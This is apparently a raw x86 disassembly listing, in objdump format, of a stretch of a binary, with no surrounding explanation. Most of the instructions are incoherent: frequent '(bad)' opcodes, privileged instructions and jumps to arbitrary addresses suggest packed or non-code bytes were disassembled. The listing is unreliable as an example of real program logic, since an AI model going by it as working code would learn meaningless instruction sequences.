  43144d:	mov    edi,eax
  43144f:	mov    dh,BYTE PTR [eax+0x266ff51]
  431455:	push   ebp
  431456:	add    BYTE PTR [ebx-0x764b0777],al
  43145c:	dec    DWORD PTR [esi+0x661851e8]
  431462:	add    BYTE PTR [ebp-0x7b],dl
  431465:	cmp    esi,0xfffffff3
  431468:	dec    DWORD PTR [ecx+0x51fe9285]
  43146e:	jmp    DWORD PTR [esi-0x75]
  431471:	push   ebp
  431472:	hlt    
  431473:	data16 (bad) 
  431475:	dec    ebp
  431476:	ret    
  431477:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  43147d:	lea    edx,[eax-0x1]
  431480:	jne    0x431453
  431482:	dec    DWORD PTR [ecx-0x2f7a63f8]
  431488:	dec    BYTE PTR [ecx+0x51559eff]
  43148e:	mov    DWORD PTR [esi-0x4c],esp
  431491:	push   ebp
  431492:	jmp    DWORD PTR [esi-0x18]
  431495:	inc    ebp
  431496:	sbb    BYTE PTR [ebp-0x767acd00],cl
  43149c:	(bad)  
  43149d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43149e:	inc    eax
  4314a0:	test   DWORD PTR [esi-0x2],esp
  4314a3:	inc    ebp
  4314a4:	dec    DWORD PTR [ebp-0x760bde75]
  4314aa:	(bad)  
  4314ab:	test   al,0xc3
  4314ad:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314b3:	lods   al,BYTE PTR ds:[esi]
  4314b4:	push   eax
  4314b5:	inc    ebp
  4314b6:	jne    0x4314c7
  4314b8:	dec    DWORD PTR [ebp+0x8]
  4314bb:	mov    eax,DWORD PTR [ebx]
  4314bd:	sbb    al,0x0
  4314bf:	(bad)  
  4314c0:	mov    eax,0xc14fc3
  4314c5:	mov    DWORD PTR [eax-0x64],edi
  4314c8:	inc    bp
  4314ca:	test   DWORD PTR [edi],ecx
  4314cc:	dec    DWORD PTR [ebp-0x1]
  4314cf:	xor    eax,edi
  4314d1:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4314d7:	inc    ebp
  4314d8:	xor    DWORD PTR [ebx],0x3f
  4314db:	mov    WORD PTR [ebp-0x1bc],ax
  4314e2:	lea    ecx,[ecx-0x767702]
  4314e8:	inc    esi
  4314e9:	(bad)  
  4314ea:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  4314f1:	pushf  
  4314f2:	rol    DWORD PTR [ebp-0x72019a],0xff
  4314f9:	add    bh,bh
  4314fb:	add    BYTE PTR [edi],cl
  4314fd:	test   DWORD PTR [eax],eax
  4314ff:	(bad)  
  431500:	dec    WORD PTR [ebp-0xff0031]
  431507:	mov    DWORD PTR [ecx-0xb748],ecx
  43150d:	lea    eax,[ebx+0x7cffc1b0]
  431513:	push   eax
  431514:	add    BYTE PTR [ebp+0x66],al
  431517:	xor    ecx,DWORD PTR [ebp-0xaf00fd]
  43151d:	test   eax,esi
  43151f:	(bad)  
  431520:	fdiv   st(7),st
  431522:	add    bh,bh
  431524:	data16 clc 
  431526:	lea    edx,[ebp-0x1]
  431529:	(bad)  
  43152a:	dec    DWORD PTR [eax-0x72b50077]
  431530:	dec    DWORD PTR [eax-0x1237a73]
  431536:	(bad)  
  431537:	(bad)  
  431538:	(bad)  
  431539:	cdq    
  43153a:	inc    DWORD PTR [eax]
  43153c:	ja     0x4314c7
  43153e:	lea    edi,[eax-0x72000050]
  431544:	push   ecx
  431545:	mov    al,0x4d
  431547:	jmp    DWORD PTR [esi+0x50]
  43154a:	mov    ch,0x45
  43154c:	push   DWORD PTR [ebx]
  43154e:	inc    DWORD PTR [ebx]
  431550:	push   ebx
  431551:	push   eax
  431552:	push   ecx
  431553:	test   DWORD PTR [ebx],esi
  431555:	(bad)  
  431556:	mov    ebx,0xff72ff
  43155b:	clc    
  43155c:	retf   
  43155d:	push   ebp
  43155e:	(bad)  
  43155f:	jmp    0x14216a4
  431564:	push   ecx
  431565:	jae    0x431527
  431567:	add    BYTE PTR [ebp-0x38bb73],cl
  43156d:	mov    DWORD PTR [ecx+0x40],edx
  431570:	(bad)  
  431571:	(bad)  
  431572:	cld    
  431573:	mov    eax,DWORD PTR [ebp-0x7a019a]
  431579:	inc    DWORD PTR [ebp-0x3f0101]
  43157f:	inc    bp
  431581:	test   DWORD PTR [ebx+0xff98ff],ecx
  431587:	inc    edi
  431588:	(bad)  
  431589:	dec    si
  43158b:	test   edi,edi
  43158d:	(bad)  
  43158e:	cmp    eax,0xc74f7bff
  431593:	mov    edx,DWORD PTR [edx-0x7d]
  431596:	(bad)  
  431597:	mov    ebx,0x563a8931
  43159c:	(bad)  
  43159d:	call   FWORD PTR [esi-0x47]
  4315a0:	inc    DWORD PTR ds:0x893c00e2
  4315a6:	mov    DWORD PTR [eax-0x4c],ebx
  4315a9:	(bad)  
  4315aa:	jmp    DWORD PTR [esi-0x1]
  4315ad:	test   edi,edi
  4315af:	dec    DWORD PTR [eax]
  4315b1:	(bad)  
  4315b2:	inc    eax
  4315b4:	or     BYTE PTR [ecx+0x8b5745],bh
  4315ba:	sbb    al,0x89
  4315bc:	rcr    BYTE PTR [edx-0x7c],0xff
  4315c0:	add    ecx,DWORD PTR [ebx+0x6165b900]
  4315c6:	add    BYTE PTR [eax],al
  4315c8:	inc    ebp
  4315c9:	mov    DWORD PTR ds:0xc7ff9c5c,esi
  4315cf:	data16 fdiv DWORD PTR [ebp-0x7007b]
  4315d6:	inc    ebp
  4315d7:	dec    ebp
  4315d8:	cmp    DWORD PTR [ecx-0x38b764],ecx
  4315de:	lock lea eax,[ebp+0x458df81c]
  4315e5:	(bad)  
  4315e6:	xor    eax,0x8b8b9fff
  4315eb:	hlt    
  4315ec:	cld    
  4315ed:	mov    DWORD PTR [eax+0xff014c],eax
  4315f3:	mov    esi,0x78b0845
  4315f8:	cld    
  4315f9:	into   
  4315fa:	dec    ebp
  4315fb:	call   0x5100:0x38c328b
  431602:	mov    ecx,DWORD PTR [ebp-0x6f0075]
  431608:	add    BYTE PTR [ebx],dh
  43160a:	mov    DWORD PTR [eax-0x1c],eax
  43160d:	lea    edi,[ebp-0x2]
  431610:	test   edi,edi
  431612:	jne    0x431664
  431614:	push   DWORD PTR [ebp+0x18]
  431617:	mov    DWORD PTR [ebp+0x44],edx
  43161a:	call   0xffcd111e
  43161f:	mov    al,0x45
  431621:	dec    DWORD PTR [ebx+0x3fc8b8b]
  431627:	cmp    BYTE PTR [ecx+eax*1],0xf
  43162b:	add    BYTE PTR [ebp-0x7b],al
  43162e:	test   edi,edi
  431630:	je     0x431631
  431632:	dec    DWORD PTR [edi-0x4]
  431635:	dec    edi
  431636:	or     al,BYTE PTR [ebp-0x740001]
  43163c:	cld    
  43163d:	dec    edi
  43163e:	or     BYTE PTR [edi+0x1],0x85
  431642:	add    bh,bh
  431644:	add    bh,bh
  431646:	(bad)  
  431647:	icebp  
  431648:	ret    
  431649:	dec    edi
  43164a:	inc    ebp
  43164b:	xchg   ebp,eax
  43164c:	jne    0x43164c
  43164e:	mov    edi,edi
  431650:	cld    
  431651:	xor    BYTE PTR [ecx+0x500155],cl
  431657:	push   ebp
  431658:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43165e:	add    BYTE PTR [ebp+0x35e90f50],al
  431664:	add    al,BYTE PTR [eax]
  431666:	add    BYTE PTR [ebx-0x38fe4f80],al
  43166c:	add    ah,ch
  43166e:	or     BYTE PTR [ebp+0x4501f845],dh
  431674:	jmp    0xdf196e
  431679:	(bad)  
  43167a:	nop    ecx
  43167d:	test   DWORD PTR [ebp+0x4502f8],eax
  431683:	cmp    ecx,DWORD PTR [ebp-0x64]
  431686:	mov    eax,edi
  431688:	mov    ebx,DWORD PTR [eax+edx*2]
  43168b:	add    eax,0x45fef885
  431690:	dec    DWORD PTR [ebx+0x339445]
  431696:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43169c:	dec    DWORD PTR [ebx-0x460f0375]
  4316a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316a3:	add    esi,edi
  4316a5:	add    bh,bh
  4316a7:	rdpmc  
  4316a9:	add    BYTE PTR [ebx],0x1
  4316ac:	mov    DWORD PTR [eax],eax
  4316ae:	add    al,0x45
  4316b0:	dec    DWORD PTR [ecx-0x360b3373]
  4316b6:	dec    DWORD PTR [esi]
  4316b8:	push   eax
  4316b9:	jne    0x431700
  4316bb:	mov    esi,DWORD PTR [ebx]
  4316bd:	cld    
  4316be:	add    ebp,ebp
  4316c0:	push   eax
  4316c1:	inc    DWORD PTR [ebp-0x75]
  4316c4:	add    eax,0x800e4
  4316c9:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4316cf:	mov    DWORD PTR [ecx],eax
  4316d1:	sbb    al,0x0
  4316d3:	leave  
  4316d4:	test   DWORD PTR [edi-0x2],eax
  4316d7:	jne    0x4316d8
  4316d9:	call   0xff4401de
  4316de:	xor    BYTE PTR [ebp+0x4d],al
  4316e1:	mov    edi,edi
  4316e3:	enter  0x8,0x4d
  4316e7:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4316ed:	mov    eax,DWORD PTR [eax]
  4316ef:	cld    
  4316f0:	add    DWORD PTR [ecx],ebx
  4316f2:	inc    ebp
  4316f3:	dec    ebp
  4316f4:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4316fa:	inc    eax
  4316fb:	dec    DWORD PTR [ecx-0x270375]
  431701:	add    BYTE PTR [ebx-0x39d72701],cl
  431707:	xchg   ecx,eax
  431708:	ret    
  431709:	add    BYTE PTR [ebp-0x830075],al
  43170f:	add    BYTE PTR [ebp-0x75],al
  431712:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431718:	lea    edi,[edi-0xc]
  43171b:	add    bh,bh
  43171d:	mov    edx,DWORD PTR [eax-0x7b]
  431720:	inc    ebp
  431721:	rdpmc  
  431723:	jne    0x431728
  431725:	add    BYTE PTR [eax-0x75],dl
  431728:	inc    ebp
  431729:	clc    
  43172a:	add    eax,0x400009
  43172f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431735:	mov    eax,DWORD PTR [ecx]
  431737:	in     al,dx
  431738:	add    dh,al
  43173a:	test   ebx,eax
  43173c:	inc    BYTE PTR [ebp-0xff0001]
  431742:	add    BYTE PTR [ebp-0x43],al
  431745:	cmp    esi,0xfffffff8
  431748:	(bad)  
  431749:	push   DWORD PTR [eax]
  43174b:	add    BYTE PTR [ebp-0x3a],dl
  43174e:	test   ebx,eax
  431750:	je     0x4316d7
  431752:	mov    edi,edi
  431754:	sbb    al,0xff
  431756:	test   DWORD PTR gs:[eax],eax
  431759:	(bad)  
  43175a:	js     0x43175b
  43175c:	add    BYTE PTR [ebx-0x39b20bdd],cl
  431762:	sub    eax,ebx
  431764:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43176a:	add    eax,DWORD PTR [eax]
  43176c:	dec    ebp
  43176d:	push   eax
  43176e:	mov    al,BYTE PTR [ebp+0x1]
  431771:	mov    eax,DWORD PTR [ebp-0x68]
  431774:	mov    eax,DWORD PTR [eax]
  431776:	sbb    bh,al
  431778:	or     ah,dh
  43177a:	dec    ebp
  43177b:	inc    DWORD PTR [eax+0x4]
  43177e:	push   ecx
  43177f:	add    BYTE PTR [edx-0x1],dh
  431782:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431788:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  431792:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431798:	push   ecx
  431799:	cmp    BYTE PTR [ebx],al
  43179b:	inc    ebp
  43179c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317a2:	(bad)  
  4317a3:	(bad)  
  4317a4:	in     al,0xff
  4317a6:	add    BYTE PTR [ebp+0x0],al
  4317a9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317af:	add    al,bh
  4317b1:	(bad)  
  4317b2:	jmp    0x8d85:0x74b0558d
  4317b9:	dec    DWORD PTR [eax]
  4317bb:	call   DWORD PTR [ebp-0x7b]
  4317be:	mov    edi,esi
  4317c0:	lock call DWORD PTR [ebp-0x75]
  4317c4:	mov    esi,esp
  4317c6:	mov    ah,0xc6
  4317c8:	mov    bh,0xc3
  4317ca:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4317d0:	add    DWORD PTR [eax],0x450050ff
  4317d6:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4317dc:	inc    edi
  4317de:	push   esp
  4317e0:	jmp    0xcd00:0x660481ff
  4317e7:	mov    DWORD PTR [ebx],esi
  4317e9:	clc    
  4317ea:	cmp    edi,0xff9cff3a
  4317f0:	jne    0x4317fa
  4317f2:	mov    eax,eax
  4317f4:	add    esi,DWORD PTR [eax]
  4317f6:	int3   
  4317f7:	inc    ebp
  4317f8:	cmp    al,0x83
  4317fa:	add    BYTE PTR [eax],bl
  4317fc:	adc    DWORD PTR [ebx+0x768b5055],eax
  431802:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431808:	mov    edi,eax
  43180a:	cmp    BYTE PTR [ebp+0x45],cl
  43180d:	jmp    0x43179a
  43180f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431812:	inc    ebp
  431813:	or     al,0x2
  431815:	dec    DWORD PTR [ebp+0x18]
  431818:	jne    0x43186f
  43181a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431820:	mov    edi,DWORD PTR [ebx]
  431822:	in     al,0x50
  431824:	xchg   ecx,eax
  431825:	jmp    0x343672a
  43182a:	adc    al,0x8b
  43182c:	inc    ebp
  43182d:	mov    al,ds:0x8b04008b
  431832:	push   ebp
  431833:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431839:	push   ebp
  43183a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431840:	inc    ebp
  431841:	dec    ebp
  431842:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431848:	mov    DWORD PTR [eax],0xe9ff00f4
  43184e:	add    al,0x0
  431850:	add    BYTE PTR [eax],al
  431852:	mov    eax,edx
  431854:	push   eax
  431855:	rol    DWORD PTR [ebp-0xf0177],1
  43185b:	bound  eax,QWORD PTR [ebp+0x50]
  43185e:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431864:	add    BYTE PTR [ecx+0x558df0ff],cl
  43186a:	mov    al,0xf
  43186c:	test   DWORD PTR [edx],edx
  43186e:	call   DWORD PTR [ebp-0x7a0001]
  431874:	(bad)  
  431875:	loop   0x431876
  431877:	jnp    0xc6990c7d
  43187d:	mov    eax,ebx
  43187f:	cmp    al,0x8b
  431881:	(bad)  
  431882:	cld    
  431883:	shr    esi,0xc
  431886:	add    dl,al
  431888:	push   eax
  431889:	lea    eax,[ebp-0x1]
  43188c:	mov    edx,esi
  43188e:	cwde   
  43188f:	cli    
  431890:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431896:	or     BYTE PTR [eax],cl
  431898:	inc    ebp
  431899:	dec    ebp
  43189a:	inc    DWORD PTR [ebx+0x74803914]
  4318a0:	add    DWORD PTR [ebx+0x451800],ecx
  4318a6:	call   DWORD PTR [eax+edx*1]
  4318a9:	add    ecx,DWORD PTR [ebp-0x34]
  4318ac:	push   edi
  4318ad:	adc    al,0x8
  4318af:	mov    edx,DWORD PTR [ebp-0x14]
  4318b2:	mov    ecx,DWORD PTR [ebp+0x18]
  4318b5:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4318b9:	inc    DWORD PTR [eax+esi*8]
  4318bc:	inc    ebp
  4318bd:	stos   BYTE PTR es:[edi],al
  4318be:	mov    edx,DWORD PTR [ebp-0x4]
  4318c1:	add    DWORD PTR [ebp-0x1c],eax
  4318c4:	mov    edx,DWORD PTR [ebp-0x70]
  4318c7:	cmp    eax,DWORD PTR [eax]
  4318c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4318ca:	mov    eax,DWORD PTR [eax]
  4318cc:	cld    
  4318cd:	jae    0x43184f
  4318cf:	add    eax,DWORD PTR [ecx]
  4318d1:	clc    
  4318d2:	add    BYTE PTR [eax+0x30],dl
  4318d5:	mov    DWORD PTR [ecx],esi
  4318d7:	clc    
  4318d8:	pop    ds
  4318d9:	inc    ebp
  4318da:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4318e0:	(bad)  
  4318e1:	push   DWORD PTR [edi]
  4318e3:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4318e9:	(bad)  
  4318ea:	jae    0x4318eb
  4318ec:	mov    eax,DWORD PTR [ebp-0x740175]
  4318f2:	sub    eax,DWORD PTR [eax]
  4318f4:	add    eax,DWORD PTR [eax]
  4318f6:	mov    DWORD PTR [ecx+0x5f],eax
  4318f9:	mov    DWORD PTR [ebx-0x4],ebx
  4318fc:	ret    0xff
  4318ff:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431905:	ret    
  431906:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43190c:	add    BYTE PTR [ebp-0x7d],al
  43190f:	mov    DWORD PTR [eax],eax
  431911:	add    al,0x84
  431913:	inc    DWORD PTR [ecx]
  431915:	lea    eax,[eax]
  431917:	hlt    
  431918:	sar    bh,cl
  43191a:	test   BYTE PTR [eax+0x1],dl
  43191d:	inc    ebp
  43191e:	add    BYTE PTR [ebx],dh
  431920:	test   BYTE PTR [ebx],0x84
  431923:	push   eax
  431924:	add    BYTE PTR [ebp+0x0],al
  431927:	add    eax,0x86
  43192c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431932:	add    BYTE PTR [ecx],al
  431934:	add    BYTE PTR [eax],al
  431936:	mov    esi,0x550030
  43193b:	mov    ecx,DWORD PTR [edi]
  43193d:	cld    
  43193e:	fidiv  DWORD PTR [ebp+0x0]
  431941:	mov    edi,DWORD PTR [ecx]
  431943:	xor    BYTE PTR [eax+eax*1],0x84
  431947:	add    eax,DWORD PTR [eax]
  431949:	sbb    BYTE PTR [eax],al
  43194b:	jne    0x4318fe
  43194d:	mov    eax,DWORD PTR [ecx]
  43194f:	sbb    BYTE PTR [eax],al
  431951:	mov    DWORD PTR [ebp-0x1],esp
  431954:	add    BYTE PTR [eax+0x30e45ca],bh
  43195a:	ret    0xb7fc
  43195d:	dec    ebp
  43195e:	or     al,0x89
  431960:	dec    ebp
  431961:	cld    
  431962:	cmovne ecx,DWORD PTR [eax-0x75]
  431966:	add    edi,esp
  431968:	seto   BYTE PTR [esi-0x72ffffff]
  43196f:	inc    ebp
  431970:	adc    al,0x8b
  431972:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431979:	cmp    DWORD PTR [edi+0x72],edx
  43197c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431982:	gs cmp al,0x0
  431985:	je     0x43195d
  431987:	push   eax
  431988:	sar    BYTE PTR [eax],1
  43198a:	mov    bh,0x3e
  43198c:	push   cs
  43198d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431993:	add    DWORD PTR [ecx+0x12],ebp
  431996:	dec    edx
  431997:	(bad)  
  431998:	mov    eax,edx
  43199a:	in     al,dx
  43199b:	adc    DWORD PTR [ecx],esi
  43199d:	pop    esi
  43199e:	inc    ecx
  43199f:	leave  
  4319a0:	or     DWORD PTR [eax],ebx
  4319a2:	gs push ebp
  4319a4:	add    ah,ch
  4319a6:	into   
  4319a7:	in     al,dx
  4319a8:	enter  0xb756,0xf0
  4319ac:	push   cs
  4319ad:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4319b7:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4319bd:	jnp    0x74439ec5
  4319c3:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4319c9:	add    BYTE PTR [edi],cl
  4319cb:	mov    edi,DWORD PTR [ecx-0x78]
  4319ce:	ltr    WORD PTR [ecx-0x7b]
  4319d2:	dec    DWORD PTR [edi]
  4319d4:	clc    
  4319d5:	out    0x45,eax
  4319d7:	add    BYTE PTR [eax],cl
  4319d9:	cmp    ebx,0xffffff8c
  4319dc:	jge    0x4319de
  4319de:	jb     0x4319f0
  4319e0:	je     0x521a60
  4319e6:	pop    edx
  4319e7:	push   esi
  4319e8:	mov    ecx,DWORD PTR [edi]
  4319ea:	in     al,dx
  4319eb:	rol    DWORD PTR [ebp+0x0],1
  4319ee:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4319f5:	cmp    DWORD PTR [ecx],0xfffffff0
  4319f8:	hlt    
  4319f9:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4319ff:	(bad)  
  431a01:	push   eax
  431a02:	jns    0xb842fe80
  431a08:	lock push cs
  431a0a:	ror    edx,0x3
  431a0d:	test   BYTE PTR [ecx+0x5500e800],cl
  431a13:	dec    eax
  431a14:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a18:	(bad)  
  431a19:	mov    esi,0x7f33ff5f
  431a1e:	inc    eax
  431a1f:	test   DWORD PTR [edx],eax
  431a21:	je     0x4319e3
  431a23:	mov    ecx,ecx
  431a25:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a29:	and    eax,DWORD PTR [eax+0xf0103]
  431a2f:	jp     0x431a1d
  431a31:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a35:	add    edx,DWORD PTR [edi+0x74]
  431a38:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a3e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a44:	je     0x4319c9
  431a46:	cmp    eax,edi
  431a48:	js     0x431a6d
  431a4a:	add    eax,0xeb0fc003
  431a4f:	jns    0x4319dc
  431a51:	vmread DWORD PTR [ecx+0x45],ebx
  431a55:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a5b:	adc    al,0x8b
  431a5d:	jge    0x431a73
  431a5f:	mov    edi,DWORD PTR [eax-0x4]
  431a62:	add    edi,DWORD PTR [edi]
  431a64:	or     bh,bh
  431a66:	push   ebp
  431a67:	push   es
  431a68:	mov    DWORD PTR [ebp-0x4],ebx
  431a6b:	add    edi,esi
  431a6d:	pop    es
  431a6e:	add    esi,DWORD PTR [edi-0x48ccf183]
  431a74:	mov    DWORD PTR [esp+esi*8],ecx
  431a77:	inc    ebp
  431a78:	pop    ebp
  431a79:	xor    DWORD PTR [esi-0x4],0x3b
  431a7d:	add    edx,DWORD PTR [ecx+edi*1]
  431a80:	push   es
  431a81:	clc    
  431a82:	mov    bh,0xdb
  431a84:	jp     0x431a3d
  431a86:	add    cl,BYTE PTR [esi]
  431a88:	div    DWORD PTR [edi+0x4d8b0c1c]
  431a8e:	test   edi,edi
  431a90:	je     0x431a86
  431a92:	mov    eax,ecx
  431a94:	or     BYTE PTR [ebx],al
  431a96:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431a9c:	jbe    0x431b10
  431a9e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431aa4:	add    ecx,DWORD PTR [esi]
  431aa6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431aac:	add    eax,DWORD PTR [ebx-0x287af783]
  431ab2:	je     0x431b01
  431ab4:	mov    DWORD PTR [ecx],edi
  431ab6:	mov    esi,eax
  431ab8:	hlt    
  431ab9:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431ac0:	jb     0x431a82
  431ac2:	jmp    0x431aaf
  431ac4:	xor    esi,DWORD PTR [ebx]
  431ac6:	pop    edi
  431ac7:	pop    esi
  431ac8:	pop    ebx
  431ac9:	ret    
  431aca:	ret    0x8b
  431acd:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431ad3:	xor    DWORD PTR ds:0x89339c0c,0x56
  431ada:	cld    
  431adb:	cmp    DWORD PTR [ebp+0xf],eax
  431ade:	xor    al,0x85
  431ae0:	pushf  
  431ae1:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  431ae7:	ret    
  431ae8:	mov    edi,DWORD PTR [esi-0x4]
  431aeb:	pop    eax
  431aec:	dec    ebp
  431aed:	jne    0x431a7a
  431aef:	xor    edi,esp
  431af1:	inc    eax
  431af2:	dec    ebp
  431af3:	jbe    0x431b48
  431af5:	inc    eax
  431af6:	pop    ebp
  431af7:	add    edx,DWORD PTR [esi+0x8]
  431afa:	push   ebx
  431afb:	dec    eax
  431afc:	push   ecx
  431afd:	mov    eax,edi
  431aff:	and    al,0xf0
  431b01:	jo     0x431aee
  431b03:	mov    eax,DWORD PTR [ebx]
  431b05:	sbb    BYTE PTR [ebp+0x4d],cl
  431b08:	mov    eax,DWORD PTR [ebx]
  431b0a:	nop
  431b0b:	or     BYTE PTR [eax],al
  431b0d:	jne    0x431b66
  431b0f:	cmp    ebx,DWORD PTR [edx+0x33893277]
  431b15:	cld    
  431b16:	xor    edi,edi
  431b18:	add    edi,DWORD PTR [ebp+0x3]
  431b1b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b21:	js     0x431aa7
  431b23:	jae    0x431b27
  431b25:	(bad)  
  431b27:	xor    al,0x5d
  431b29:	jmp    0x431ab6
  431b2b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b32:	fdecstp 
  431b34:	test   BYTE PTR [edi],ah
  431b36:	add    bh,BYTE PTR [ebp+0x0]
  431b39:	add    ebx,DWORD PTR [ebp-0x77]
  431b3c:	mov    edi,eax
  431b3e:	cmp    al,0x0
  431b41:	adc    dh,BYTE PTR [ebx]
  431b43:	jge    0x431b48
  431b45:	mov    edi,DWORD PTR [ebx]
  431b47:	jl     0x431b58
  431b49:	clc    
  431b4a:	dec    edi
  431b4b:	jge    0x431b4d
  431b4d:	mov    eax,DWORD PTR [ebx]
  431b4f:	jb     0x431b59
  431b51:	mov    ecx,DWORD PTR [ebp-0x8]
  431b54:	mov    edi,edi
  431b56:	xor    edx,DWORD PTR [eax]
  431b58:	add    edi,DWORD PTR [ebx]
  431b5a:	mov    DWORD PTR [ebp-0x10],edi
  431b5d:	inc    edi
  431b5e:	pop    ebp
  431b5f:	jge    0x431b9c
  431b61:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431b65:	mov    edx,0xc05d87f0
  431b6a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431b6e:	fimul  WORD PTR [eax]
  431b70:	fist   WORD PTR [ebp+0x1c]
  431b73:	in     al,dx
  431b74:	jne    0x431b62
  431b76:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431b7c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431b80:	fdivp  st(0),st
  431b82:	fild   WORD PTR [ebp+0x4510f85c]
  431b88:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431b8e:	inc    ebp
  431b8f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431b95:	mov    ebp,DWORD PTR [ebx-0x4]
  431b98:	adc    al,0x8b
  431b9a:	rcl    DWORD PTR [eax],0x48
  431b9d:	mov    esi,0x7080803
  431ba2:	fiadd  WORD PTR [ebp+0x4d]
  431ba5:	(bad)  
  431ba6:	mov    edx,DWORD PTR [edx-0x4]
  431ba9:	mov    edx,DWORD PTR [ebp-0x4]
  431bac:	xor    ebx,DWORD PTR [ebx+0x330103]
  431bb2:	mov    DWORD PTR [edi+0x872dc],edi
  431bb8:	xlat   BYTE PTR ds:[ebx]
  431bb9:	into   
  431bba:	ffreep st(6)
  431bbc:	retf   0x6c7
  431bbf:	iret   
  431bc0:	dec    ebp
  431bc1:	inc    ebp
  431bc2:	mov    DWORD PTR [ebx],edi
  431bc4:	fmul   QWORD PTR [edi]
  431bc6:	dec    ebp
  431bc7:	jnp    0x431bfc
  431bc9:	add    BYTE PTR [ebx],al
  431bcb:	mov    ecx,DWORD PTR [esp+edi*8]
  431bce:	inc    ebp
  431bcf:	dec    ebp
  431bd0:	lea    esi,[ebx]
  431bd2:	add    DWORD PTR [ebx],eax
  431bd4:	jb     0x431c11
  431bd6:	add    BYTE PTR [edi],cl
  431bd8:	inc    ebp
  431bd9:	imul   eax,edi,0x858bd800
  431bdf:	cld    
  431be0:	clc    
  431be1:	mov    DWORD PTR [ebp+0x0],eax
  431be4:	inc    DWORD PTR [eax]
  431be6:	or     al,0xde
  431be8:	sbb    bh,0x1
  431beb:	retf   
  431bec:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431bf3:	dec    ebp
  431bf4:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431bfa:	enter  0x12de,0xdf
  431bfe:	inc    ebp
  431bff:	pop    ebp
  431c00:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c06:	add    DWORD PTR [edx],edx
  431c08:	add    BYTE PTR [ebp+0x50],dl
  431c0b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c11:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  431c18:	loopne 0x431c31
  431c1a:	cdq    
  431c1b:	push   ebp
  431c1c:	clc    
  431c1d:	mov    eax,DWORD PTR [ebp-0x4]
  431c20:	xor    edx,edx
  431c22:	add    esi,DWORD PTR [ebx]
  431c24:	cmp    eax,DWORD PTR [ebx]
  431c26:	hlt    
  431c27:	cmp    DWORD PTR [ebx],esp
  431c29:	or     al,BYTE PTR [ebp+0xf]
  431c2c:	mov    eax,DWORD PTR [edx]
  431c2e:	loopne 0x431c30
  431c30:	(bad)  
  431c31:	mov    ecx,esi
  431c33:	cld    
  431c34:	pushf  
  431c35:	pop    ebp
  431c36:	call   0x10c0:0x8bf0328b
  431c3d:	add    eax,DWORD PTR [eax+0x10018b]
  431c43:	dec    ebp
  431c44:	iret   
  431c45:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c4b:	dec    ebp
  431c4c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c52:	(bad)  
  431c53:	iret   
  431c54:	inc    ebp
  431c55:	(bad)  
  431c56:	jne    0x431ca5
